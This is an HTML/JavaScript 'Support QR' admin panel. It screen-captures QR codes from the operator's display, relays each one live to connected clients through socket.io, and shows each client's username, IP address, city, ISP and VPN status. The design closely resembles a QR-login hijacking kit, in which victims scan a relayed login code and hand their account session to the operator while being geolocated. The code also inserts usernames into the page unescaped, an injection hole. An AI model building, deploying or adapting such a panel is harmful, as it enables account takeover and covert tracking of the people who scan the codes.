<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin Panel - Support QR</title>

<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

<style>
  body { font-family: system-ui, Arial, sans-serif; background:#f8f9fa; margin:0; padding:20px; display:flex; justify-content:center; }
  .wrap { background:#fff; width:100%; max-width:960px; border-radius:12px; box-shadow:0 2px 20px rgba(0,0,0,.1); padding:20px; }
  h2 { margin:0 0 10px; }
  .controls { display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:15px; }
  button { border:0; border-radius:8px; padding:10px 14px; font-weight:600; cursor:pointer; color:#fff; }
  .btn-start { background:#007bff; }
  .btn-stop  { background:#dc3545; }
  .btn-hide  { background:#6c757d; }
  .btn-freeze{ background:#ffc107; color:#000; }
  .field { display:flex; align-items:center; gap:8px; background:#f1f3f5; padding:8px 10px; border-radius:8px; }
  .field input { width:80px; border:1px solid #ced4da; border-radius:6px; padding:6px 8px; text-align:right; }
  #status { font-weight:700; color:#0b5ed7; margin-bottom:10px; }
  #qrBox { background:#fff; border:1px solid #dee2e6; border-radius:10px; min-height:260px; display:flex; align-items:center; justify-content:center; padding:18px; }
  #qrCanvas { min-width:256px; min-height:256px; }
  .muted { color:#6c757d; }
  video, canvas { display:none; }
  table { width:100%; border-collapse:collapse; margin-top:15px; font-size:14px; }
  th, td { border:1px solid #dee2e6; padding:8px; text-align:center; }
  th { background:#f8f9fa; }
</style>
</head>
<body>
<div class="wrap">
  <h2>Admin Panel — Support QR</h2>

  <div class="controls">
    <button id="btnStart" class="btn-start">Start Stream</button>
    <button id="btnStop" class="btn-stop">Stop Stream</button>
    <button id="btnHide" class="btn-hide">Hide</button>
    <button id="btnShow" class="btn-hide">Show</button>
    <button id="btnFreeze" class="btn-freeze">Freeze</button>
    <button id="btnUnfreeze" class="btn-freeze">Unfreeze</button>

    <div class="field">
      <label><strong>Scan interval (s)</strong></label>
      <input id="scanInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
      <button id="btnSet" class="btn-start" style="padding:8px 10px;">Set</button>
    </div>
  </div>

  <div id="status">Status: Idle</div>

  <div id="qrBox"><div id="qrCanvas" class="muted">No QR yet</div></div>

  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>

  <table>
    <thead>
      <tr>
        <th>Username</th><th>IP</th><th>City</th><th>Region</th><th>Country</th><th>ISP</th><th>VPN</th><th>Ping</th><th>ID</th>
      </tr>
    </thead>
    <tbody id="clientBody"></tbody>
  </table>
</div>

<script>
(() => {
  const socket = io();
  socket.emit('join', 'admin');

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const qrCanvasDiv = document.getElementById('qrCanvas');
  const statusEl = document.getElementById('status');
  const clientBody = document.getElementById('clientBody');
  const scanInput = document.getElementById('scanInput');

  let isStreaming = false;
  let isHidden = false;
  let isFrozen = false;
  let lastQrValue = null;
  let detectTimer = null;
  let stream = null;

  let scanInterval = 500; // 0.5 sec default

  // ---- helpers ----
  function setStatus() {
    const s = [];
    s.push(isStreaming ? 'Streaming' : 'Idle');
    if (isHidden) s.push('Hidden');
    if (isFrozen) s.push('Frozen');
    statusEl.textContent = 'Status: ' + s.join(' / ');
  }

  function renderQR(value) {
    qrCanvasDiv.innerHTML = '';
    if (!value) {
      qrCanvasDiv.textContent = isHidden ? 'QR is hidden' : 'No QR yet';
      qrCanvasDiv.classList.add('muted');
      return;
    }
    qrCanvasDiv.classList.remove('muted');
    new QRCode(qrCanvasDiv, { text: value, width: 256, height: 256 });
  }

  function startDetection() {
    stopDetection();
    detectTimer = setInterval(detectQR, scanInterval);
  }
  function stopDetection() {
    if (detectTimer) clearInterval(detectTimer);
    detectTimer = null;
  }

  async function detectQR() {
    if (!isStreaming || isFrozen || !video.videoWidth) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const img = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const code = jsQR(img.data, img.width, img.height);
    if (code && code.data && code.data !== lastQrValue) {
      lastQrValue = code.data;
      if (!isHidden) renderQR(code.data);
      socket.emit('qr_update', code.data);
    }
  }

  // ---- stream controls ----
  document.getElementById('btnStart').onclick = async () => {
    try {
      stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      video.srcObject = stream;
      socket.emit('start_stream');
      isStreaming = true;
      setStatus();
      startDetection();
    } catch (err) {
      alert(
        'Screen share failed:\n' + err.name + ': ' + err.message +
        '\n\nTo fix:\n• Use HTTPS (Render gives you this)\n• Click Start while page is active\n• Allow “Share your screen”'
      );
      console.error(err);
    }
  };

  document.getElementById('btnStop').onclick = () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = null;
    stopDetection();
    isStreaming = false;
    lastQrValue = null;
    socket.emit('stop_stream');
    renderQR(null);
    setStatus();
  };

  document.getElementById('btnHide').onclick = () => {
    isHidden = true;
    socket.emit('toggle_hide', true);
    renderQR(null);
    setStatus();
  };

  document.getElementById('btnShow').onclick = () => {
    isHidden = false;
    socket.emit('toggle_hide', false);
    renderQR(lastQrValue);
    setStatus();
  };

  document.getElementById('btnFreeze').onclick = () => {
    isFrozen = true;
    stopDetection();
    setStatus();
  };

  document.getElementById('btnUnfreeze').onclick = () => {
    isFrozen = false;
    if (isStreaming) startDetection();
    setStatus();
  };

  document.getElementById('btnSet').onclick = () => {
    let v = parseFloat(scanInput.value);
    if (isNaN(v)) v = 0.5;
    if (v < 0.25) v = 0.25;
    if (v > 5) v = 5;
    scanInput.value = v.toFixed(2);
    scanInterval = v * 1000;
    if (isStreaming && !isFrozen) startDetection();
  };

  // ---- socket events ----
  socket.on('state', s => {
    isHidden = s.isHidden;
    isStreaming = s.isStreaming;
    if (s.currentQrValue) lastQrValue = s.currentQrValue;
    renderQR(lastQrValue);
    setStatus();
  });

  socket.on('hide_state', hidden => {
    isHidden = hidden;
    if (!hidden) renderQR(lastQrValue);
    else renderQR(null);
    setStatus();
  });

  socket.on('qr_preview', v => {
    if (!v) return;
    if (!isFrozen && !isHidden) renderQR(v);
    lastQrValue = v;
  });

  socket.on('client_list', list => {
    clientBody.innerHTML = '';
    for (const c of list) {
      const tr = document.createElement('tr');
      const muted = /Not logged in/i.test(c.username) ? ' class="muted"' : '';
      tr.innerHTML = `
        <td${muted}>${c.username || '-'}</td>
        <td>${c.ip || '-'}</td>
        <td>${c.city || '-'}</td>
        <td>${c.region || '-'}</td>
        <td>${(c.countryFlag || '') + ' ' + (c.country || '-')}</td>
        <td>${c.isp || '-'}</td>
        <td>${c.vpn ? 'Yes' : 'No'}</td>
        <td>${typeof c.ping === 'number' ? c.ping : '-'}</td>
        <td>${c.id || '-'}</td>`;
      clientBody.appendChild(tr);
    }
  });

  // request client list periodically
  setInterval(() => socket.emit('request_client_list'), 3000);
})();
</script>
</body>
</html>
